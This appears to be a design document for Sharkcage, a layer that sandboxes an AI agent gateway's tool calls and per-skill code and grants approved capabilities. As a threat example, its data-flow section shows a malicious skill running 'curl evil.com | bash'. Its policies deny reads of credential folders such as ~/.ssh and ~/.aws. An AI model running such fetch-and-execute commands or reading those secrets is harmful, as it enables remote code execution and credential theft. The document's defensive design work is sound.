---
layout: doc
title: Sharkcage — Trust Layer for OpenClaw
description: Wraps every AI-directed tool call with kernel-level sandboxing. Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem.
---

# Sharkcage

A trust and sandboxing layer for OpenClaw. Every AI-directed tool call runs through kernel-level sandboxing via `srt`. Every skill also runs in its own kernel-enforced per-skill sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.

Version: 2.0.0
Date: 2026-03-29

---

## Table of Contents

1. [What This Is](#1-what-this-is)
2. [Personas](#2-personas)
3. [Architecture](#3-architecture)
4. [The Permission Problem](#4-the-permission-problem)
5. [Capability Model](#5-capability-model)
6. [Sandbox Enforcement](#6-sandbox-enforcement)
7. [AI Capability Inference](#7-ai-capability-inference)
8. [Skill Scanning and Signing](#8-skill-scanning-and-signing)
9. [Data Flows](#9-data-flows)
10. [Security Model](#10-security-model)
11. [Repo Structure](#11-repo-structure)
12. [Implementation Plan](#12-implementation-plan)

---

## 1. What This Is

**OpenClaw** is a self-hosted gateway connecting 22+ chat platforms to AI agents via Pi. MIT licensed, 339k stars. It handles channels, sessions, routing, skills, web UI, and mobile apps.

**OpenClaw's security gap:** Skills run as untrusted code with no permission model. ClawHub has no verification. The sandbox is global, not per-skill. Users either run unsandboxed or deal with per-action permission prompts and eventually pass `--dangerously-skip-permissions`.

**Sharkcage** fills this gap without forking OpenClaw:

| What | Who Provides |
|------|-------------|
| 22+ chat channels, gateway, Pi agent, web UI, mobile apps, ClawHub | **OpenClaw** (unmodified) |
| Per-tool kernel sandboxing — every AI command runs through srt | **Sharkcage** |
| Per-skill kernel sandboxing — each skill gets its own srt sandbox | **Sharkcage** |
| Capability manifests — approve once, enforce always | **Sharkcage** |
| AI inference of capabilities for existing OpenClaw skills | **Sharkcage** |
| Skill scanning, Ed25519 signing, trust levels | **Sharkcage** |

**Day-one OpenClaw ecosystem compatibility.** Every existing ClawHub skill works. Sharkcage's AI reads the skill code and generates a capability manifest. The user approves. The skill runs sandboxed. No changes needed from skill authors.

---

## 2. Personas

### 2.1 Home User — "Alex"
Non-technical. Chat assistant via HA voice or Signal. "What's for dinner?" / "Turn off the lights." Installs from curated list. Capability approval in plain language.

### 2.2 Power User — "Sam"
Runs a homelab. Installs community skills. Reviews scoped capabilities. May write simple SKILL.md files.

### 2.3 Developer — "Jordan"
Software engineer. Uses `sc` CLI + coding agents. Writes and signs skills. 1-2 nodes.

### 2.4 Platform Engineer — "Riley"
Multi-project, multi-model, multi-agent. CI scanning. Audit logs. Cost tracking.

### 2.5 Feature Matrix

| Feature | Alex | Sam | Jordan | Riley |
|---------|:----:|:---:|:------:|:-----:|
| Chat (Signal/HA/Telegram/etc.) | Y | Y | Y | Y |
| Capability approval | plain language | scoped | manifest-level | CI strict |
| Write skills | - | Y | Y | Y |
| Sign/publish skills | - | - | Y | Y |
| Multi-agent coding | - | - | Y | Y |
| Audit logs | - | - | - | Y |

### 2.6 Auditability Principle

- Skill code is readable: one SKILL.md, no build step
- Capabilities are explicit: approved by user, persisted as JSON
- Every tool call logged: timestamp, tool, args, result, skill, capability
- Scanner is deterministic: same findings every time
- No hidden network calls: kernel-enforced per-skill domain allowlists
- History is queryable: all data in SQLite
- Dashboard shows provenance: which skill, which capability, when approved

---

## 3. Architecture

### 3.1 The Supervisor Model

Sharkcage is a supervisor process that owns all sandboxes. The OpenClaw gateway process runs unsandboxed — it serves deterministic chat server code, not AI-directed operations. Every individual AI tool call (bash, file read/write) goes through `srt --settings <session-policy>` via the sandbox backend. Each skill runs in its own per-skill srt sandbox. The supervisor manages skill sandboxes and audit logging.

```
sc start (supervisor + process manager)
  │
  ├── OpenClaw (gateway — NOT sandboxed)
  │   │  Channels: Signal, Telegram, WhatsApp, Discord, HA, iMessage...
  │   │  Sharkcage plugin registered as sandbox backend
  │   │
  │   │  On tool call → srt --settings <session-policy> /bin/sh -c <cmd>
  │   │  On skill call → IPC to supervisor via unix socket
  │   │
  │   └── unix socket ──→ supervisor
  │
  ├── PER-SKILL ASRT SANDBOX → meals worker
  │   network: [meals-api.wan0.cloud]
  │   filesystem: none
  │
  ├── PER-SKILL ASRT SANDBOX → HA worker
  │   network: [homeassistant.local:8123]
  │   filesystem: none
  │
  └── PER-SKILL ASRT SANDBOX → coding agent
      network: [github.com, registry.npmjs.org, openrouter.ai]
      filesystem: [./workspace]
      exec: [git, npm, node]
```

**Key properties:**
- Every AI tool call is kernel-sandboxed via srt — bash commands, file operations, all of them
- The gateway process is NOT sandboxed — it runs deterministic server code, not AI-directed operations
- Skills cannot reach each other's hosts
- Installing a new skill never widens the tool sandbox
- The supervisor spawns per-skill sandboxes and manages audit logging

### 3.2 Data Flow

```
User sends message on Signal
  │
  ▼
OpenClaw (gateway, unsandboxed) receives message, routes to Pi Agent
  │
  ▼
Pi Agent calls LLM (OpenRouter) → LLM returns tool call
  │
  ▼
Sharkcage interceptor (tool.before) inside OpenClaw:
  1. Identify which skill owns this tool
  2. Check capability approval

  For regular tool calls (bash, file ops):
  3. Sandbox backend invokes: srt --settings <session-policy> /bin/sh -c <cmd>
  4. srt enforces filesystem + network policy at kernel level
  5. Return result to Pi Agent

  For skill calls:
  3. Send IPC request to supervisor: {skill, tool, args}
  │
  ▼
Supervisor:
  1. Look up skill's approved capabilities
  2. Generate ASRT config for this skill
  3. Spawn (or reuse) skill worker process in its own per-skill ASRT sandbox
  4. Pass tool call via stdin
  5. Read result from stdout
  6. Log to audit DB
  7. Return result to OpenClaw via IPC
  │
  ▼
Sharkcage interceptor returns result to Pi Agent
  │
  ▼
Pi Agent formats response → OpenClaw → Signal → user
```

### 3.3 Per-Tool Session Policies

Per-tool session policies are generated dynamically by the sandbox backend. Each session gets an ASRT config restricting filesystem and network access for all tool calls in that session.

```bash
# Session policy example (generated at session start):
~/.config/sharkcage/sessions/<session-id>.json:
  network.allowedDomains: ["openrouter.ai"]
  filesystem.allowWrite: ["~/.openclaw/data"]
  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]
```

Every AI tool call in that session is wrapped:
```bash
srt --settings ~/.config/sharkcage/sessions/<session-id>.json /bin/sh -c <cmd>
```

**Policy is scoped to the session** — the sandbox backend generates a fresh policy per session based on the active skill's approved capabilities. No session-wide config file is signed or locked; enforcement is per-invocation at the kernel level.

**Immutable audit trail:** every tool call appended to `audit.db` with timestamp, tool, args, result, skill, and capability.

### 3.4 Sharkcage Sits Above the Agent

The coding agent runs inside the inner skill sandbox unaware of restrictions:

```
Sharkcage Capability Gate
  "Does this skill have approved capabilities?" → YES/NO
      │
Per-Skill ASRT Sandbox
  Kernel-enforced, scoped to approved hosts/paths
      │
Coding Agent (Claude Code / Pi / OpenCode / Aider)
  Runs as if --dangerously-skip-permissions
  Actual permissions are TIGHTER than default
  No prompts. No fatigue. No skipping.
      │
OS Kernel (Seatbelt / bubblewrap+seccomp)
  Cannot be bypassed by any userspace code
```

Any agent runtime works without modification.

### 3.5 Integration Points (no OpenClaw fork)

| Hook | What sharkcage does |
|------|-------------------|
| **Interceptor `tool.before`** | Capability check + IPC to supervisor for out-of-process execution |
| **Interceptor `tool.after`** | Audit log |
| **Plugin `before_tool_call`** | First-time approval flow for new capabilities |
| **OpenClaw `registerTool`** | Register additional tools |
| **OpenClaw `registerHttpRoute`** | Webhook for results |
| **Process supervisor** | `sc start` owns all ASRT sandboxes |

---

## 4. The Permission Problem

| Approach | Prompts | Security | UX |
|----------|---------|----------|----|
| Claude Code default | Every action | Good | Unusable — prompt fatigue |
| `--dangerously-skip-permissions` | Never | None | Where users end up |
| **Sharkcage** | Once at install | Kernel-enforced | Approve once, enforce always |

---

## 5. Capability Model

### 5.1 Named Capabilities

19 capabilities across 7 categories:

| Category | Capabilities | Risk |
|----------|-------------|------|
| Network | `network.external`, `network.internal` | medium |
| Home | `home.read`, `home.control`, `home.automation` | low-medium |
| Data | `data.meals`, `data.history`, `data.memory`, `data.preferences` | low-medium |
| Notify | `notify.signal`, `notify.push` | low-high |
| System | `system.files.read`, `system.files.write`, `system.exec`, `system.env` | high-dangerous |
| Cost | `cost.api` | medium |

### 5.2 Manifest Format

```json
{
  "name": "meals",
  "capabilities": [
    {
      "capability": "network.external",
      "reason": "Call the meals API backend",
      "scope": ["meals-api.wan0.cloud"]
    },
    {
      "capability": "data.meals",
      "reason": "Read and update fridge, pantry, recipes"
    }
  ]
}
```

### 5.3 Scope Narrows Risk

`network.external` with `scope: ["meals-api.wan0.cloud"]` is fundamentally different from `network.external` with no scope. Unscoped dangerous capabilities are flagged loudly during scanning.

### 5.4 Approval Persistence

Stored in `~/.config/sharkcage/approvals/{skill-name}.json`. Version-pinned. New version with new capabilities → user prompted for new ones only.

### 5.5 Approval UX Adapts to Persona

- **Alex**: "Meal Planner wants to see your fridge. Allow?"
- **Sam**: "Meal Planner requests: Meal Data (low), External Network to meals-api.wan0.cloud (medium). Allow?"
- **Jordan**: reviews manifest directly
- **Riley**: `sc verify --strict` in CI

---

## 6. Sandbox Enforcement

### 6.1 ASRT (Anthropic Sandbox Runtime)

`@anthropic-ai/sandbox-runtime`. Apache-2.0. OS-level primitives:

| Platform | Filesystem | Network | Subprocess |
|----------|-----------|---------|-----------|
| macOS | sandbox-exec (Seatbelt) | Seatbelt + proxy | Seatbelt |
| Linux | bubblewrap (bind mounts) | Network namespace + proxy | seccomp BPF |

Kernel-enforced. Wraps any process — not just JS/TS.

### 6.2 Per-Tool srt Sandboxing

Every AI-directed tool call is wrapped by the sandbox backend using `srt --settings <session-policy>`. The session policy is derived from the active skill's approved capabilities and enforced at the kernel level for each invocation.

```
Session policy (generated dynamically per session):
  network.allowedDomains: ["openrouter.ai"]
  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/sharkcage"]
  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]
```

The gateway process itself is not sandboxed — it runs deterministic server code. Only AI-directed operations (bash commands, file reads/writes passed through the sandbox backend) go through srt.

### 6.3 Per-Skill ASRT Configuration

Each skill gets its own ASRT config derived from approved capabilities:

```
Skill "meals" approved for:
  network.external: ["meals-api.wan0.cloud"]
  data.meals

→ Per-skill ASRT config:
  network.allowedDomains: ["meals-api.wan0.cloud"]
  filesystem.allowWrite: []
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

```
Skill "coding-agent" approved for:
  system.exec: ["git", "npm", "node"]
  system.files.write: ["./workspace"]
  network.external: ["github.com", "registry.npmjs.org"]

→ Per-skill ASRT config:
  network.allowedDomains: ["github.com", "registry.npmjs.org"]
  filesystem.allowWrite: ["./workspace"]
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

### 6.4 Silent Enforcement

No prompts at runtime. Violations are logged, not prompted:

```
[sharkcage] network violation: skill "meals" → evil.com (BLOCKED)
            allowed: meals-api.wan0.cloud
            logged to audit.db
```

### 6.5 Process Isolation

Skills run as separate processes in their own per-skill sandboxes. OpenClaw and skills cannot see each other's network scope or filesystem access. The supervisor mediates all communication via IPC.

---

## 7. AI Capability Inference

Existing OpenClaw skills and ClawHub skills don't have capability manifests. Sharkcage generates them automatically.

### 7.1 How It Works

```bash
sc skill add some-clawhub-skill
  │
  ├── Download skill
  ├── No capability manifest found
  │
  ├── AI reads SKILL.md:
  │   - Parses tool definitions
  │   - Identifies HTTP endpoints called (domain extraction)
  │   - Identifies filesystem operations (paths, read vs write)
  │   - Identifies shell commands referenced
  │   - Identifies environment variables used
  │
  ├── Generates capability manifest:
  │   {
  │     "capabilities": [
  │       {"capability": "network.external", "scope": ["api.github.com"],
  │        "reason": "AI-inferred: skill makes GitHub API calls"},
  │       {"capability": "system.exec", "scope": ["git", "gh"],
  │        "reason": "AI-inferred: skill runs git commands"}
  │     ],
  │     "inferred": true,
  │     "inferredBy": "claude-sonnet-4",
  │     "inferredAt": "2026-03-29T10:00:00Z"
  │   }
  │
  ├── Scanner runs on inferred manifest
  │   (same checks as author-provided manifests)
  │
  ├── User reviews:
  │   "This skill appears to need:
  │     External Network: api.github.com (medium, AI-inferred)
  │     Run Programs: git, gh (high, AI-inferred)
  │   Allow? [Y/n/details/edit]"
  │
  └── Installed with inferred manifest, runs sandboxed
```

### 7.2 User Can Edit Inferred Manifests

If the AI over-infers (requests too much) or under-infers (misses something), the user can edit:

```bash
sc skill capabilities edit some-skill
# Opens manifest in editor
# Changes are validated by scanner
# Re-signed if user has signing key
```

### 7.3 Author Manifests Override AI

If a skill author provides a `plugin.json` with capabilities, the AI inference is skipped. Author manifests are more accurate and carry the author's signature.

### 7.4 Inference Improves Over Time

The AI sees: skill code + what actually got blocked at runtime (from audit logs). On skill update, the AI can refine the manifest based on observed behaviour.

---

## 8. Skill Scanning and Signing

### 8.1 The Scanner

```bash
sc verify ./my-skill

  Y [PLUGIN_001] Manifest valid
  ! [PLUGIN_002] Skill is unsigned
  . [PLUGIN_OK] Found 8 tool(s)
  . [PLUGIN_OK] External Network: meals-api.wan0.cloud (medium)
  . [PLUGIN_OK] Meal Data (low)

  PASS with 1 warning(s)
```

Checks: manifest validation, signature verification, capability risk assessment, static analysis (subprocess, filesystem, FFI patterns), tool definition completeness.

### 8.2 Signing

Ed25519. Trust levels: `full` (auto-load), `prompt` (ask before loading), `audit` (load but log everything).

### 8.3 Install Flow

```bash
sc skill add https://github.com/user/some-skill

  Cloning... Scanning...
  No manifest found — running AI capability inference...

  This skill appears to need:
    External Network: api.github.com (medium, AI-inferred)
    Run Programs: git, gh (high, AI-inferred)

  Allow? [Y/n/details/edit]
```

---

## 9. Data Flows

### Flow 1: "What's for dinner?" (Signal)

```
Signal → OpenClaw (gateway) → Pi Agent → LLM → tool call: meals_suggest
  → sharkcage interceptor → IPC → supervisor
  → supervisor spawns meals worker (per-skill ASRT: meals-api.wan0.cloud only)
  → worker calls meals API → result
  → supervisor → IPC → OpenClaw → Pi formats response → Signal → user
```

### Flow 2: "Turn off the lights" (HA voice)

```
HA Assist → OpenClaw → Pi → tool call: ha_call_service
  → supervisor → HA worker (per-skill ASRT: homeassistant.local only)
  → POST homeassistant.local/api/services/light/turn_off
  → "Done, lights off." → HA TTS
```

### Flow 3: Existing ClawHub skill installed

```
sc skill add clawhub-skill
  → download → no manifest → AI reads SKILL.md
  → infers: network.external: ["some-api.com"], system.exec: ["curl"]
  → scanner validates inferred manifest
  → user reviews and approves
  → installed, runs in its own per-skill ASRT sandbox
  → works exactly as it did on vanilla OpenClaw, but sandboxed
```

### Flow 4: Malicious skill blocked

```
Skill tries: curl evil.com | bash
  → supervisor checks: skill's per-skill ASRT config has allowedDomains: ["weather.com"]
  → ASRT blocks connection to evil.com at kernel level
  → skill gets ECONNREFUSED
  → audit log: "network violation: skill 'weather' → evil.com (BLOCKED)"
  → user never sees a prompt
```

---

## 10. Security Model

### 10.1 Defence in Depth (6 Layers)

```
Layer 1: Session policy (per-tool srt sandboxing — all AI tool calls)
Layer 2: OpenClaw tool policy (deny groups, exec security)
Layer 3: Sharkcage capability gate (interceptor — check approval)
Layer 4: Sharkcage approval flow (first-time dangerous ops → confirm once)
Layer 5: Per-skill ASRT sandbox (kernel-enforced, out-of-process)
Layer 6: Supervisor audit logging (every tool call recorded)
```

### 10.2 Threat Matrix

| Threat | Mitigation |
|--------|-----------|
| Skill reads ~/.ssh | ASRT mandatory deny — always blocked via per-tool session policy |
| Skill exfiltrates to unknown host | Per-skill ASRT: only approved hosts. Per-tool session policy: only approved hosts. Kernel-enforced. |
| Skill writes outside workspace | Per-skill ASRT: allowWrite scoped. Kernel-enforced. |
| Skill runs destructive commands | Capability gate blocks unless system.exec approved. ASRT scopes to allowed binaries. |
| AI-directed tool call escapes sandbox | srt wraps every tool call — gateway runs no AI-directed operations unsandboxed. |
| Skill accesses another skill's service | Out-of-process isolation. Meals worker can't reach HA. HA worker can't reach meals API. |
| New skill widens tool sandbox | Skills run in their own per-skill sandboxes. Installing skills never changes other sandbox configs. |
| Supply chain: malicious ClawHub skill | AI inference + scanner + user approval before any code runs. |
| Prompt injection via tool results | Capability gate applies to subsequent calls. Cross-skill tool calls checked against originating skill. |

### 10.3 Remaining Gaps

**Gap 1: User approves too broadly.** Scanner warns. Possible improvement: require scoping for dangerous capabilities.

**Gap 2: Cross-skill context leakage in shared Pi session.** Skills share conversation context. A malicious skill could read other skills' tool results. Mitigation: out-of-process execution limits data exposure, but Pi session is still shared. Improvement: per-skill session isolation.

**Gap 3: Prompt injection causing cross-skill tool calls.** Mitigated by capability gate checking tool ownership. Improvement: track originating skill per turn.

**Gap 4: No runtime cost enforcement.** Audit log tracks usage. Improvement: budget caps per skill.

**Gap 5: srt overhead per tool call.** Every AI tool call forks a new srt process. For high-frequency tool use this adds latency. Improvement: reuse sandboxed worker processes per session.

**Gap 6: AI inference accuracy.** AI might over-infer or under-infer capabilities. Mitigated by user review + edit capability. Improves with audit log feedback.

**Gap 7: Supervisor is unsandboxed.** The supervisor process has full access. It's ~200 lines of code, does nothing except spawn sandboxed processes and shuttle IPC. Attack surface is minimal but exists. Mitigated by code simplicity and signing.

### 10.4 Philosophy

Make the risk visible. Make the boundaries enforceable. Let the user decide once, enforce always. Don't nag on every action.

---

## 11. Repo Structure

### 11.1 What Stays

```
sharkcage/                         # Public umbrella
├── docs/                          # Design doc, architecture diagram
│   ├── unified-platform.md
│   └── architecture.svg
├── cli/                           # sc CLI
│
├── packages/                      # submodules
│   ├── sdk/                       # Capability types, ASRT mapper, scanning (DONE)
│   ├── supervisor/                # Process supervisor, ASRT spawning, audit (DONE)
│   ├── openclaw-plugin/           # Interceptors, IPC to supervisor (DONE)
│   ├── cli/                       # sc CLI: init, verify, sign, approve (PARTIAL)
│   ├── inference/                 # AI capability inference (NOT STARTED)
│   └── frontend/                  # Dashboard additions to OpenClaw web UI (SCAFFOLD)
```

### 11.2 What Was Retired

| Repo | Why Retired |
|------|-----------|
| `yeet-core` | OpenClaw is the gateway. Custom Deno gateway was a stepping stone. Archived. |
| `yeet-sandbox` | Supervisor has ASRT integration built in. Redundant. Archived. |

### 11.3 Skills (separate repos, each its own per-skill sandbox)

```
sharkcage-skill-meals/             # Meal planning (DONE, needs IPC refactor)
sharkcage-skill-ha/                # Home Assistant control (NOT STARTED)
sharkcage-skill-briefing/          # News briefing (NOT STARTED)
sharkcage-skill-composio/          # Multi-agent orchestration (NOT STARTED)
sharkcage-skill-godot/             # Godot game dev via MCP (NOT STARTED)
```

Any existing OpenClaw/ClawHub skill also works — AI infers capabilities automatically.
MCP servers run as sandboxed skills (supervisor spawns them in per-skill ASRT, stdio transport).

### 11.4 Runtime

Node.js + TypeScript everywhere. Consistent with OpenClaw.

| Component | Runtime | Why |
|-----------|---------|-----|
| OpenClaw | Node.js | It's an OpenClaw ecosystem |
| Supervisor | Node.js (via tsx) | Same runtime as OpenClaw |
| CLI | Node.js (via tsx) | Same runtime |
| Skills | Node.js (via tsx) | Compatible with OpenClaw skills |
| SDK | Pure TypeScript | Runtime-agnostic (works anywhere) |
| ASRT (srt) | Go binary | Wraps everything, runtime doesn't matter |

No Deno. One runtime, one ecosystem. User installs Node.js (required for OpenClaw anyway) and that's it.

### 11.5 Dependency Graph

```
sharkcage-sdk                      (zero deps — DONE)
  |
sharkcage-supervisor               (sdk + srt — DONE)
  |
sharkcage-openclaw-plugin          (sdk — DONE)
sharkcage-cli                      (sdk — PARTIAL)
sharkcage-inference                (sdk + LLM client — NOT STARTED)
sharkcage-frontend                 (talks to supervisor API — SCAFFOLD)
sharkcage-skill-*                  (sdk for types — meals DONE, rest NOT STARTED)
```

### 11.6 Line Counts

| Component | Lines | Status |
|-----------|------:|--------|
| sharkcage-sdk | ~700 | Done |
| sharkcage-supervisor | ~580 | Done |
| sharkcage-openclaw-plugin | ~380 | Done |
| sharkcage-cli | ~500 | Partial (~200 remaining) |
| sharkcage-skill-meals | ~350 | Done (needs IPC refactor) |
| sharkcage-inference | ~200 | Not started |
| sharkcage-frontend | ~1500 | Not started |
| **Trust path total** | **~1,660** | **Auditable in an afternoon** |

---

## 12. Implementation Plan

### Phase 1: Supervisor + Sandbox — DONE

- [x] `sharkcage-sdk`: capability types, ASRT config mapper, scanning, testing
- [x] `sharkcage-supervisor`: unix socket IPC, approval store, ASRT sandbox spawning, audit log
- [x] `sharkcage-openclaw-plugin`: tool.before/after interceptors, IPC client, skill mapping
- [x] `sharkcage-cli`: init wizard (persona-driven), verify scanner
- [x] `sharkcage-skill-meals`: 8 tools with capability manifest
- [ ] Test: manually create approval, supervisor spawns sandboxed process

### Phase 2: End-to-End Integration

- [ ] `sc start` command: starts supervisor + OpenClaw gateway (unsandboxed) + sandbox backend
- [ ] Install OpenClaw locally, register sharkcage plugin
- [ ] Test: Signal message → OpenClaw → sharkcage interceptor → supervisor → sandboxed skill → result
- [ ] Test: skill tries to reach unapproved host → ASRT blocks → audit log entry

### Phase 3: Homelab Skills

- [ ] Refactor `sharkcage-skill-meals` for out-of-process IPC model (stdin/stdout JSON)
- [ ] `sharkcage-skill-ha`: Home Assistant (state reading, service calls, automations)
- [ ] `sharkcage-skill-briefing`: news digest from existing CF Worker
- [ ] Test: "what's for dinner?" and "turn off the lights" via Signal

### Phase 4: AI Capability Inference

- [ ] `sharkcage-inference`: read SKILL.md, send to LLM, extract capabilities
- [ ] `sc skill add`: clone → infer → scan → approve → install
- [ ] Test with 5 popular ClawHub skills
- [ ] Validates day-one OpenClaw ecosystem compatibility

### Phase 5: CLI Completion

- [ ] `sc approve`: review and modify capability approvals
- [ ] `sc config`: add/remove services, re-sign gateway config
- [ ] `sc audit`: query audit log
- [ ] `sc sign`: Ed25519 signing
- [ ] `sc skill list/remove`: plugin management
- [ ] SSH and AWS as opt-in capabilities (controlled access, not blanket deny)

### Phase 6: Dashboard + Signing

- [ ] Dashboard additions to OpenClaw's web UI
- [ ] Capability approval management UI
- [ ] Trust store management
- [ ] CI integration: `sc verify --strict`

### Phase 7: Advanced (ongoing)

- [ ] Budget enforcement per skill
- [ ] Per-skill session isolation
- [ ] Godot plugin (MCP bridge to GPU node)
- [ ] SSH/AWS controlled access capabilities
- [ ] Runtime cost alerting
- [ ] Community skill curation tooling
